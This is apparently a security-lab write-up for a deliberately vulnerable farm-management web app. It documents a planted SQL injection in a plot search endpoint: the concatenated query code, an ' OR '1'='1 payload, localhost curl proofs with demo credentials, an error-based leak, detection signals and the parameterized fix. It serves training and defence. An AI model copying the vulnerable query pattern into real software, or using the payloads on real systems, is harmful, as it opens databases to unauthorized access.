# SQL Injection — Plot Search

## Target

- Route: `GET /api/plots?search=<term>`
- Screen: **Plots** page search bar (`app/client/src/pages/Plots.jsx`)
- Code: `app/server/src/app.js`, marked `LAB_VULNERABILITY (sql-injection)`

## Why it exists

The `search` parameter is concatenated directly into the SQL string instead of
being passed as a bound parameter:

```js
const sql = `SELECT * FROM plots
             WHERE user_id = ${req.user.id}
               AND (name LIKE '%${search}%' OR location LIKE '%${search}%' OR crop_type LIKE '%${search}%')
             ORDER BY updated_at DESC`;
db.prepare(sql).all();
```

Any quote in `search` breaks out of the `LIKE` literal and lets the attacker
rewrite the query's logic.

## Safe local proof-of-concept

Run against your **local** instance only.

1. Start the app and log in as the demo user.
2. In the Plots search bar, enter a narrow term such as `River` — one plot is
   returned (`River Paddock`).
3. Now enter the payload:

   ```text
   ' OR '1'='1
   ```

   Every plot is returned regardless of the search text, because the predicate
   becomes always-true.

### cURL equivalent

```bash
TOKEN=$(curl -s -X POST http://127.0.0.1:4000/api/login \
  -H 'content-type: application/json' \
  -d '{"email":"farmer@securefarm.local","password":"password123"}' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')

# Baseline narrow search
curl -s "http://127.0.0.1:4000/api/plots?search=River" -H "authorization: Bearer $TOKEN"

# Injected always-true predicate returns all plots
curl -s "http://127.0.0.1:4000/api/plots?search=%27%20OR%20%271%27%3D%271" \
  -H "authorization: Bearer $TOKEN"
```

### Error-based information leak

A lone quote produces a verbose driver error (the endpoint returns
`err.message`), confirming injection and leaking SQL internals:

```bash
curl -s "http://127.0.0.1:4000/api/plots?search=%27" -H "authorization: Bearer $TOKEN"
# {"error":"... syntax error ..."}
```

## Scope note

The query is still constrained by `user_id = ${req.user.id}`, so the lab payload
above only widens results within the logged-in user's own plots. The injection
point is real; UNION-style cross-table extraction is left as a later lab
exercise once additional tables/users are seeded.

## Expected detection signal (AWS phase)

- Spikes of 4xx/5xx on `/api/plots` in CloudWatch / ALB access logs.
- AWS WAF SQLi managed rule matches on the query string once an ALB + WAF are in
  front of the app.
- Anomalous query strings containing `'`, `OR`, `UNION` in application logs.

## Eventual fix

Use bound parameters and a parameterized `LIKE`:

```js
db.prepare(
  `SELECT * FROM plots
   WHERE user_id = ?
     AND (name LIKE @q OR location LIKE @q OR crop_type LIKE @q)
   ORDER BY updated_at DESC`
).all(req.user.id, { q: `%${search}%` });
```

Stop returning raw `err.message` to clients.
